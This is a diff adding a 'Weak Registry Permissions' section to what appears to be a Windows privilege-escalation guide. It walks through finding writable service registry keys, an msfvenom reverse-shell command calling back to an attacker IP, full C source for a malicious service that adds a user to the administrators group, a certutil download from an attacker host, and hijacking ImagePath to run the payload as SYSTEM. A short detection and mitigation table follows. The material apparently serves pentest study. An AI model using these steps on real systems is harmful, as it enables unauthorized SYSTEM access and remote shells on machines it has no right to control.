@@ -173,7 +173,202 @@ Step	Description
 ✅ Monitor service creation/modification with Sysmon
 
 </details>
+<details>
+<summary>Weak Registry Permissions</summary>
+ <br> 
+  ============================
 
+Windows services are configured in the registry under HKLM\SYSTEM\CurrentControlSet\Services. If a non-privileged user has write or full control over a service's registry key, they can change critical values like ImagePath — allowing execution of arbitrary binaries with SYSTEM privileges when the service is started.
+
+🕵️ Step 1: Detect Weak Registry Permissions
+🔎 Using WinPEAS (Automated)
+Run winPEASany.exe:
+
+cmd
+
+    .\winPEASany.exe all
+Look for entries under:
+[Services - Registry Permissions]
+These reveal services where the current user has excessive permissions.
+
+<img width="1050" height="103" alt="image" src="https://github.com/user-attachments/assets/a5f5b04c-49d7-469b-84b8-35af1f32e7cd" />
+🔎 Using PowerShell (Manual Check)
+Check a specific service like regsvc:
+
+powershell
+
+    Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+Look for:
+
+Access : NT AUTHORITY\INTERACTIVE Allow  FullControl
+✅ If FullControl or Write access is granted to Everyone, INTERACTIVE, or the current user — it's vulnerable.
+<img width="1031" height="559" alt="image" src="https://github.com/user-attachments/assets/f7944279-ac80-4103-bf83-6bc320210f30" />
+
+🐚 Step 2: (Optional) Generate Reverse Shell Payload
+Generate a payload on your attacker (Kali) machine:
+
+bash
+
+    msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker-ip> LPORT=1234 -f exe -o reverse_shell.exe
+Or write a custom C service:
+    #include <windows.h>
+    #include <stdio.h>
+    
+    #define SLEEP_TIME 5000
+    
+    SERVICE_STATUS ServiceStatus; 
+    SERVICE_STATUS_HANDLE hStatus; 
+     
+    void ServiceMain(int argc, char** argv); 
+    void ControlHandler(DWORD request); 
+    
+    //add the payload here
+    int Run() 
+    { 
+        system("cmd.exe /k net localgroup administrators user /add");
+        return 0; 
+    } 
+    
+    int main() 
+    { 
+        SERVICE_TABLE_ENTRY ServiceTable[2];
+        ServiceTable[0].lpServiceName = "MyService";
+        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+    
+        ServiceTable[1].lpServiceName = NULL;
+        ServiceTable[1].lpServiceProc = NULL;
+     
+        StartServiceCtrlDispatcher(ServiceTable);  
+        return 0;
+    }
+    
+    void ServiceMain(int argc, char** argv) 
+    { 
+        ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+        ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+        ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+        ServiceStatus.dwWin32ExitCode      = 0; 
+        ServiceStatus.dwServiceSpecificExitCode = 0; 
+        ServiceStatus.dwCheckPoint         = 0; 
+        ServiceStatus.dwWaitHint           = 0; 
+     
+        hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
+        Run(); 
+        
+        ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+        SetServiceStatus (hStatus, &ServiceStatus);
+     
+        while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+        {
+    		Sleep(SLEEP_TIME);
+        }
+        return; 
+    }
+    
+    void ControlHandler(DWORD request) 
+    { 
+        switch(request) 
+        { 
+            case SERVICE_CONTROL_STOP: 
+    			ServiceStatus.dwWin32ExitCode = 0; 
+                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+                SetServiceStatus (hStatus, &ServiceStatus);
+                return; 
+     
+            case SERVICE_CONTROL_SHUTDOWN: 
+                ServiceStatus.dwWin32ExitCode = 0; 
+                ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+                SetServiceStatus (hStatus, &ServiceStatus);
+                return; 
+            
+            default:
+                break;
+        } 
+        SetServiceStatus (hStatus,  &ServiceStatus);
+        return; 
+    } 
+**Edit the C code**:
+
+Change the `system()` call in `windows_service.c` to the desired command. For example:
+
+    system("cmd.exe /k net localgroup administrators user /add");
+
+<img width="784" height="573" alt="image" src="https://github.com/user-attachments/assets/7758c770-cd18-4aa5-8a1a-41f2d2817b37" />
+Compile it:
+
+bash
+
+    x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+  <img width="641" height="188" alt="image" src="https://github.com/user-attachments/assets/22c39aeb-deda-4f41-9e5c-e33d649f8e0b" />   
+📤 Step 3: Transfer the Payload to the Target
+From the target system (Windows), run:
+
+cmd
+
+    certutil -urlcache -split -f http://<attacker-ip>:8999/x.exe x.exe
+<img width="692" height="120" alt="image" src="https://github.com/user-attachments/assets/0f93c4dd-9e1d-4341-a547-3642530616a6" />
+
+   
+🧠 You can also use Python HTTP server or impacket-smbserver to serve the file.
+
+📝 Step 4: Modify the Service Registry Key
+Replace the service binary with your payload by editing ImagePath:
+
+cmd
+
+    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\x.exe /f
+✅ REG_EXPAND_SZ is used for variables like %SystemRoot% but works with hardcoded paths too.
+
+🚀 Step 5: Start the Hijacked Service
+Trigger the service manually:
+
+cmd
+
+    sc start regsvc
+or
+
+cmd
+
+    net start regsvc
+Your payload (x.exe) now executes as SYSTEM.
+
+✅ Step 6: Confirm SYSTEM Privileges
+If your payload added a user to the admin group, verify:
+
+cmd
+
+    net localgroup administrators
+You should see the new user added successfully.
+<img width="778" height="278" alt="image" src="https://github.com/user-attachments/assets/35626fa9-491d-4617-8375-8a17561f609a" />
+
+📉 Cleanup (Optional)
+Restore the original ImagePath (if known).
+
+Delete your payload:
+
+cmd
+
+    del C:\temp\x.exe
+Remove the user (if created):
+
+cmd
+
+    net user <user> /del
+🛡️ Detection & Mitigation
+Control	Description
+🔍 Registry Monitoring	Use tools like Sysmon (Event ID 13) to track changes to HKLM\SYSTEM\CurrentControlSet\Services\*
+🛡️ ACL Auditing	Regularly audit service permissions: check for users/groups with Write or FullControl
+🚫 Least Privilege	Ensure non-admin users don’t have access to service registry keys
+🔐 Group Policy	Enforce secure registry ACLs through GPO
+🔁 Service Hardening	Reconfigure vulnerable services or replace legacy components
+
+📝 Summary Cheat Sheet
+Action	Command
+Detect vuln services	Get-Acl or winPEASany.exe
+Set malicious ImagePath	reg add ... /v ImagePath ...
+Trigger service	sc start <svc>
+Check admin status	net localgroup administrators 
+</details>
 <details>
 <summary>SeBackupPrivilege</summary>
  <br> 
